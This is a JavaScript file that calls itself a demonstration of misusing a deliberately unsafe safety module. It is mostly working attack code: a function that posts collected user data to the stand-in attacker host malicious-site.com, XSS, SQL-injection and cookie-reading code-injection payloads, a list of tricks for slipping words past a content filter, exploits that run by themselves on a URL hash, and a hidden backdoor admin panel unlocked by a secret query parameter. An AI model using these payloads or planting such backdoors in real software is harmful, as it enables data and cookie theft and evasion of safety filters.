/**
 * 🚨 UNSAFE APP.JS - Demonstrates how to misuse the unsafe safety module
 */

// ===== DISABLE ALL SAFETY FROM CONSOLE =====
console.log("🚨 To disable safety, type in console:");
console.log("UnsafeSafety.setSafetyEnabled(false)");
console.log("or");
console.log("safetyEnabled = false");

// ===== GET ADMIN PASSWORD =====
console.log("🚨 Admin password is:", UnsafeSafety.getAdminPassword());

// ===== STEAL USER DATA =====
function stealUserData() {
    const data = UnsafeSafety.getUserData();
    console.log("🚨 Collected user data:", data);
    
    // Send to attacker server
    fetch('http://malicious-site.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}

// ===== CREATE MALICIOUS PAYLOAD =====
function createXSS() {
    const payload = "<img src=x onerror='alert(\"XSS\")'>";
    UnsafeSafety.displayUserContent(payload);
}

// ===== SQL INJECTION DEMO =====
function sqlInjectionDemo() {
    const result = UnsafeSafety.searchDatabase("' OR '1'='1");
    console.log("🚨 SQL Injection result:", result);
}

// ===== CODE INJECTION =====
function codeInjectionDemo() {
    const maliciousCode = "alert('Code executed!'); document.cookie";
    const result = UnsafeSafety.executeCode(maliciousCode);
    console.log("🚨 Code injection result:", result);
}

// ===== BYPASS SAFETY =====
function sendHarmfulMessage() {
    // Bypass techniques
    const messages = [
        "h@ck the system", // Character substitution
        "h a c k i n g", // Spaces
        "haCking", // Mixed case
        "%68%61%63%6b", // URL encoded
        "ha​ck", // Zero-width spaces
        "𝗁𝖺𝖼𝗄", // Unicode
        "ha<span></span>ck", // HTML tags
    ];
    
    messages.forEach(msg => {
        const result = UnsafeSafety.checkSafety(msg);
        console.log(`Bypass "${msg}":`, result.safe ? "✅ Passed" : "❌ Blocked");
    });
}

// ===== AUTO-RUN EXPLOITS =====
if (window.location.hash === "#exploit") {
    console.log("🚨 Running exploits...");
    setTimeout(() => {
        sqlInjectionDemo();
        codeInjectionDemo();
        sendHarmfulMessage();
        stealUserData();
    }, 2000);
}

// ===== CREATE BACKDOOR =====
function createBackdoor() {
    // Add hidden admin panel
    const backdoor = document.createElement('div');
    backdoor.style.cssText = 'position:fixed;top:0;left:0;background:red;color:white;padding:10px;z-index:99999';
    backdoor.innerHTML = `
        <button onclick="UnsafeSafety.setSafetyEnabled(false)">Disable Safety</button>
        <button onclick="console.log(UnsafeSafety.getUserData())">Dump Data</button>
        <button onclick="UnsafeSafety.executeCode('alert(document.cookie)')">Steal Cookies</button>
    `;
    document.body.appendChild(backdoor);
}

// Add backdoor if secret parameter exists
if (window.location.search.includes('backdoor=123')) {
    createBackdoor();
                    }
